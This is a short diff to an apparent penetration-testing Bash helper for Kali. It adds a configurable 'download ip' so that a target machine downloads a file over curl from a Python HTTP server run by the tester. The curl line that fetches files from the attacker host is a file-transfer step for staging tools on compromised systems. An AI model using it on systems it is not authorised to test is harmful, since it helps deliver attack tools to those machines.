@@ -74,13 +74,15 @@ curl_upload_file() {
     fi
 
     # Generate GUI form items (label, type (optional: default text), name, default (optional))
+    DOWNLOAD_IP_FIELD=$(form_item "download ip" "download_ip" "${KALI_IP}")
     PYTHON_HTTP_PORT_FIELD=$(form_item "Python HTTP port" "number" "python_http_port" "1234")
     FILE_LOCATION_FIELD=$(form_item "file location" "file_location" "${file}")
     CREATE_FOLDER_FIELD=$(form_item "create folder location" "select" "create_folder" "no" "yes|no")
 
     # Generate GUI form
-    generate_form "${PYTHON_HTTP_PORT_FIELD}" "${FILE_LOCATION_FIELD}" "${CREATE_FOLDER_FIELD}"
+    generate_form "${DOWNLOAD_IP_FIELD}" "${PYTHON_HTTP_PORT_FIELD}" "${FILE_LOCATION_FIELD}" "${CREATE_FOLDER_FIELD}"
 
+    DOWNLOAD_IP=${form_data["download_ip"]}
     PYTHON_HTTP_PORT=${form_data["python_http_port"]}
     FILE_LOCATION=${form_data["file_location"]}
     CREATE_FOLDER=${form_data["create_folder"]}
@@ -94,7 +96,7 @@ curl_upload_file() {
     # start python server: location, python http port, TTL time (default: 60)
     start_python_server "${location}" "${PYTHON_HTTP_PORT}" "${time_to_life}"
 
-    curl_download "http://${KALI_IP}:${PYTHON_HTTP_PORT}/${file}" "${FILE_LOCATION}"
+    curl_download "http://${DOWNLOAD_IP}:${PYTHON_HTTP_PORT}/${file}" "${FILE_LOCATION}"
 
     # if location is without path add ./ prefix
     if [[ "${FILE_LOCATION}" == $(basename "${FILE_LOCATION}") ]]; then
